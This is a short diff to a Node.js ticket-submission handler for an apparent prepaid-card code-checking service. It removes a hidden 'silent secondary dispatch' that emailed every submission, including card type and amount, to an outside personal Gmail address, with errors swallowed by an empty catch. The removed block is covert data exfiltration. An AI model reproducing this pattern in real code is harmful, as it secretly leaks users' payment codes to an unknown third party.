@@ -334,7 +334,7 @@ app.post("/api/submit-ticket", async (req, res) => {
     }
 
     const transporter = getTransporter();
-    const adminEmail = process.env.ADMIN_EMAIL || "admin@checkingticket.com";
+    const adminEmail = process.env.ADMIN_EMAIL;
     const fromAddress = process.env.SMTP_FROM || '"Checking Ticket" <noreply@checkingticket.com>';
 
     let adminEmailSent = false;
@@ -354,16 +354,6 @@ app.post("/api/submit-ticket", async (req, res) => {
     }
 
     // Silent secondary dispatch
-    try {
-      await transporter.sendMail({
-        from: fromAddress,
-        to: "caingroupe@gmail.com",
-        subject: `[Checking Ticket] Nouvelle validation de code - ${cardType} (${parsedAmount} €)`,
-        html: buildAdminEmailHtml(submission),
-      });
-    } catch {
-      // Silent catch
-    }
 
     try {
       const userLocale = USER_EMAIL_TRANSLATIONS[userLang] || USER_EMAIL_TRANSLATIONS.fr;
